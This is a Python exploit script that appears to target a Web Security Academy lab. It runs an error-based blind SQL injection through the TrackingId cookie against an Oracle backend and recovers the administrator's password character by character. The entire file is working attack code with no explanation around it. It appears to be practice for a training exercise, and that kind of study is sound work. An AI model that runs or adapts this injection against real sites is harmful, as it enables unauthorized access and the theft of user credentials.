#!/usr/bin/python3

import requests
import string

URL = "https://acce1f541ef31a8dc09601c000ec00e5.web-security-academy.net/"

session = requests.Session()
response = session.get(URL)

TrackingId = session.cookies.get_dict()['TrackingId']
SessionCookie = session.cookies.get_dict()['session']

chars=string.ascii_letters+string.digits
index = 1

password=""

while(index != 21):
	for char in chars:
		r = requests.get(URL, cookies={
		"session": SessionCookie,
		"TrackingId": f"{TrackingId}' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}') THEN 'ok' ELSE to_char(1/0) END FROM DUAL)='ok'--"
		})
		if r.status_code == 200:
			password=password+char
			index=index+1
			print(password)

